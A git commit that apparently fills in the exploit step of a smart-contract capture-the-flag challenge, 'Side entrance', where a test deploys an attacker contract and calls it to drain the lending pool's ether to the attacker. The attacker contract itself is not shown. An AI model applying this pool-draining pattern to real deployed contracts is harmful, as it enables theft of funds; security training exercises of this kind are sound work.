3adeb557e2bebe929286a3c5995270e7ef172bac
JM <jalilmarkel1992@gmail.com>
2022-07-13 22:54:58 +0800

    truster

--- test/side-entrance/side-entrance.challenge.js
+++ test/side-entrance/side-entrance.challenge.js
@@ -13,7 +13,7 @@ describe('[Challenge] Side entrance', function () {
 
         const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
         this.pool = await SideEntranceLenderPoolFactory.deploy();
-        
+
         await this.pool.deposit({ value: ETHER_IN_POOL });
 
         this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);
@@ -25,6 +25,14 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        console.log(ethers.utils.formatEther(this.attackerInitialEthBalance))
+        const attackerContractF = await ethers.getContractFactory('SideEntranceAttacker', attacker);
+        let attackerContract = await attackerContractF.deploy()
+        await attackerContract.execute({value: ethers.utils.parseEther('100')})
+        await attackerContract.attack(this.pool.address, attacker.address)
+        // this.pool.deposit({from:attacker, value:ethers.utils.parseEther('100')})
+        console.log(ethers.utils.formatEther(this.attackerInitialEthBalance))
+
     });
 
     after(async function () {
@@ -32,7 +40,7 @@ describe('[Challenge] Side entrance', function () {
         expect(
             await ethers.provider.getBalance(this.pool.address)
         ).to.be.equal('0');
-        
+
         // Not checking exactly how much is the final balance of the attacker,
         // because it'll depend on how much gas the attacker spends in the attack
         // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
